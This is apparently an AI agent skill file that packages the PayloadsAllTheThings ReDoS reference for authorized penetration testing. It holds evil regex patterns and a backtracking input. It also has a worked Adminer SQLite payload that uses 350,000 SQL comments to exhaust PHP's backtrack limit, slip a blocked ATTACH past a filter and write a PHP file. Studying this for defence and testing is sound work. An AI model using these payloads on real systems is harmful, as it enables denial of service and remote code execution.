---
name: payloads-regex
description: "Regular Expression Denial of Service (ReDoS) is a type of attack that exploits the fact that certain regular expressions can take an extremely long time to process, causing applications or services to become unresponsive or crash. A CLI and library which tests with certainty if a regex pattern is safe from ReDoS attacks. Supported in the browser, Node and Deno. Find regular expressions which are..."
---

# ReDoS & Regex Attack Payloads

> **Source:** [PayloadsAllTheThings/Regular Expression](https://github.com/swisskyrepo/payloadsallthethings/tree/master/Regular%20Expression)
> **Category:** `payloads-research` | **Skill ID:** `payloads-regex`

## Overview

Regular expression exploitation payloads for ReDoS, catastrophic backtracking, and filter bypass.

This skill integrates the full **PayloadsAllTheThings** (PATT) payload library for the **ReDoS & Regex Attack Payloads** domain into the REA_Skill framework. Use it during authorized penetration testing, bug bounty research, security audits, and CTF challenges.

## Workflow

### 1. Recon & Identification
- Identify the target technology stack and injection points
- Enumerate endpoints, parameters, and input vectors
- Determine applicable payload categories from the reference below

### 2. Payload Selection
- Browse the PATT payload library for the attack class
- Select encoding-appropriate payloads for the target environment
- Consider WAF bypass variants and obfuscation techniques

### 3. Exploitation (Authorized Only)
- Test payloads in order: passive → active → escalation
- Document every payload tested and its response
- Capture PoC evidence (screenshots, HTTP logs, curl output)

### 4. Verification & Reporting
- Confirm the vulnerability with a clean minimal PoC
- Map findings to CVE/CWE where applicable
- Report with remediation recommendations and code fixes

---

## Full PATT Reference

# Regular Expression

> Regular Expression Denial of Service (ReDoS) is a type of attack that exploits the fact that certain regular expressions can take an extremely long time to process, causing applications or services to become unresponsive or crash.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Evil Regex](#evil-regex)
    * [Backtrack Limit](#backtrack-limit)
* [References](#references)

## Tools

* [tjenkinson/redos-detector](https://github.com/tjenkinson/redos-detector) - A CLI and library which tests with certainty if a regex pattern is safe from ReDoS attacks. Supported in the browser, Node and Deno.
* [doyensec/regexploit](https://github.com/doyensec/regexploit) - Find regular expressions which are vulnerable to ReDoS (Regular Expression Denial of Service)
* [devina.io/redos-checker](https://devina.io/redos-checker) - Examine regular expressions for potential Denial of Service vulnerabilities

## Methodology

### Evil Regex

Evil Regex contains:

* Grouping with repetition
* Inside the repeated group:
    * Repetition
    * Alternation with overlapping

**Examples**:

* `(a+)+`
* `([a-zA-Z]+)*`
* `(a|aa)+`
* `(a|a?)+`
* `(.*a){x}` for x \> 10

These regular expressions can be exploited with `aaaaaaaaaaaaaaaaaaaaaaaa!` (20 'a's followed by a '!').

```ps1
aaaaaaaaaaaaaaaaaaaa! 
```

For this input, the regex engine will try all possible ways to group the `a` characters before realizing that the match ultimately fails because of the `!`. This results in an explosion of backtracking attempts.

### Backtrack Limit

Backtracking in regular expressions occurs when the regex engine tries to match a pattern and encounters a mismatch. The engine then backtracks to the previous matching position and tries an alternative path to find a match. This process can be repeated many times, especially with complex patterns and large input strings.  

**PHP PCRE configuration options**:

| Name                 | Default  | Note                     |
| -------------------- | -------- | ------------------------ |
| pcre.backtrack_limit |  1000000 | 100000 for `PHP < 5.3.7` |
| pcre.recursion_limit |  100000  | /                        |
| pcre.jit             | 1        | /                        |

Sometimes it is possible to force the regex to exceed more than 100 000 recursions which will cause a ReDOS and make `preg_match` returning false:

```php
$pattern = '/(a+)+$/';
$subject = str_repeat('a', 1000) . 'b';

if (preg_match($pattern, $subject)) {
    echo "Match found";
} else {
    echo "No match";
}
```

**Real-Word case: Adminer SQLite RCE**:

Adminer used a regular expression to prevent SQLite queries beginning with ATTACH:

```php
$pattern = "~^(?:\\s|/\\*[\s\S]*?\\*/|(?:#|--)[^\n]*\n?|--\r?\n)*+ATTACH\\b~i";
if(preg_match($pattern, $query, $match)){
 die('error');
}
```

The check treated both `0` (no match) and `false` (regular expression evaluation failure) as an allowed query. An attacker could prefix an `ATTACH` query with hundreds of thousands of empty SQL comments:

```php
<?php
$payload = <<<'SQL'
ATTACH DATABASE 'lol.php' AS lol;
CREATE TABLE lol.pwn (data text);
INSERT INTO lol.pwn (data) VALUES ('<?php phpinfo(); ?>');
SQL;

echo str_repeat("--\n", 350000) . $payload;
```

Processing the comments exhausted PHP PCRE's backtracking limit. `preg_match()` returned `false`, which the application confused with a clean non-match. The blocked `ATTACH` query was consequently executed.

## References

* [Intigriti Challenge 1223 - Hackbook Of A Hacker - December 21, 2023](https://web.archive.org/web/20260210185049/https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)
* [MyBB Admin Panel RCE CVE-2023-41362 - SorceryIE - September 11, 2023](https://web.archive.org/web/20251115110845/https://blog.sorcery.ie/posts/mybb_acp_rce/)
* [OWASP Validation Regex Repository - OWASP - March 14, 2018](https://web.archive.org/web/20241005224013/https://wiki.owasp.org/index.php/OWASP_Validation_Regex_Repository)
* [PCRE > Installing/Configuring - PHP Manual - May 3, 2008](https://web.archive.org/web/20260219065508/https://www.php.net/manual/en/pcre.configuration.php)
* [Regular expression Denial of Service - ReDoS - Adar Weidman - December 4, 2019](https://web.archive.org/web/20200309080846/https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

---

## REA MCP Integration

```javascript
// REA MCP — Automated payload injection via REA tools
// Use analyze_function, procedure_pseudo_code, or observe_native_calls
// to identify injection sinks, then apply payloads from this skill.
```

## Legal Notice

> ⚠️ **Authorized Use Only.** All payloads in this skill are for security research, penetration testing with written permission, CTF competitions, and defensive study. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
